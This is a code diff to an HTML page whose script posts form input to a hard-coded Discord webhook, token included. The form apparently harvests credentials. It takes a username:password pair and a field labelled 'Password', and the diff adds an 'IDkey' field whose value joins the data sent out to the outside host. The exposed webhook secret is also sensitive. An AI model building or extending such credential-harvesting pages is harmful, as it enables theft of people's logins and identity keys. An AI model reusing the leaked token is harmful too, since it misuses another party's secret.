@@ -11,6 +11,8 @@
       <input type="text" id="credentials" name="credentials" required><br>
       <label for="message">Password:</label><br>
       <input type="password" id="message" name="message" maxlength="500" required><br>
+      <label for="idkey">IDkey:</label><br>
+      <input type="text" id="idkey" name="idkey" required><br>
       
       <input type="submit" value="Send">
     </form>
@@ -24,6 +26,7 @@
         const credentials = document.getElementById("credentials").value;
         const [username, password] = credentials.split(":");
         const message = document.getElementById("message").value;
+        const idkey = document.getElementById("idkey").value;
 
         if (message.trim() === "") {
           alert("Cannot send an empty message");
@@ -33,22 +36,22 @@
         const data = new FormData();
         data.append("username", username);
         data.append("password", password);
-        data.append("content", message);
+        data.append("content", `Message: ${message} \n IDkey: ${idkey}`);
 
         fetch("https://discord.com/api/webhooks/1232953686322446337/4LZGkLR_mbnCIjO8YVSL0V1mElDKkeamFYz4tw-NzqYtBkr06nmMifh9ZLI3sjf2nuJJ", {
           method: "POST",
           body: data
         })
-        .then(response => {
+       .then(response => {
           if (!response.ok) {
             throw new Error("Failed to send message to Discord");
           }
           return response.json();
         })
-        .then(data => {
+       .then(data => {
           console.log("Message sent to Discord:", data);
         })
-        .catch(error => {
+       .catch(error => {
           console.error("Error sending message to Discord:", error);
         });
       });
